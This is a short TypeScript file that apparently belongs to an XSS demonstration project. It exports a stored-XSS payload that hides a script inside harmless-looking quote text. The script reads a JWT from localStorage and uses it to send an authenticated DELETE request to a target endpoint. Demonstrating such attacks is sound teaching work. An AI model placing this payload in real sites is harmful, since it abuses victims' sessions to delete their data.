import { ATTACKED_ENDPOINT } from "@/constants/http.contants";

export const XSS_SCRIPT = `Seemingly harmless quote! Lorem ipsum dolor sit amet, consectetur adipisicing elit. Fugit, quasi.
<script>
	(() => {
		fetch("${ATTACKED_ENDPOINT}", {
			method: "DELETE",
			headers: {
				authorization: "Bearer " + localStorage.getItem("JWT_ACCESS_TOKEN_KEY"), // Get token from localStorage
			},
		});
	})()
</script>`;
